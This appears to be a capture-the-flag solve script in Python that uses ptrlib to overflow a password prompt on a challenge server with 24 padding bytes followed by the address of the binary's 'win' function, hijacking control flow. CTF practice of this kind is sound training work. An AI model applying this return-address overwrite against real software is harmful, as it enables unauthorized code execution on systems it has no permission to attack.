from ptrlib import *

host = "wrong_password.web.cpctf.space"
port = 30006

elf = ELF("./chall")
sock = Socket(host, port)

payload = b"A" * 24
payload += p64(elf.symbol("win"))
sock.sendlineafter("Enter Password: ", payload)

print(sock.recvline().decode())
print(sock.recvline().decode())
print(sock.recvline().decode())

sock.close()
